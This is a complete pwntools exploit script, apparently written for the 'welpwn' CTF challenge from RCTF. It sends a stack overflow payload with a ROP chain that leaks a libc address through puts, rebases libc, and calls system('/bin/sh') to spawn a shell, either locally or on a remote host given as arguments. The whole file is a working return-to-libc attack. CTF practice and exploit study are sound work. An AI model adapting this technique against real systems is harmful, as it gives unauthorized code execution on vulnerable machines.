from pwn import *
# from LibcSearcher import *

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-peda
b* 0x0000000000400819
b* 0x0000000000400833
b* 0x00000000004007cc
b* 0x0000000000400793
continue
'''.format(**locals())

#Binary filename
exe = './welpwn'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

################################################################

p = start()
libc = ELF("./libc6_2.23-0ubuntu11_amd64.so")

pop_rdi = 0x00000000004008a3
pop_4 = 0x000000000040089c

payload = b"a" * 24 + p64(pop_4)
payload += p64(pop_rdi) + p64(elf.got.read) + p64(elf.plt.puts)
payload += p64(elf.sym.main)


p.recvuntil(b"Welcome to RCTF\n")
p.sendline(payload)

offset = 0xf8030

p.recvuntil(b"a" * 24)

leak = u64(p.recvuntil(b"\n")[-7:-1].ljust(8, b"\x00"))
log.info("leak = " + hex(leak))

libc.address = leak - libc.sym["read"]
log.info("libc = " + hex(libc.address))

payload = b"a" * 24 + p64(pop_4)
payload += p64(pop_rdi) + p64(next(libc.search(b"/bin/sh")))
payload += p64(libc.sym.system)

p.sendline(payload)

p.interactive()
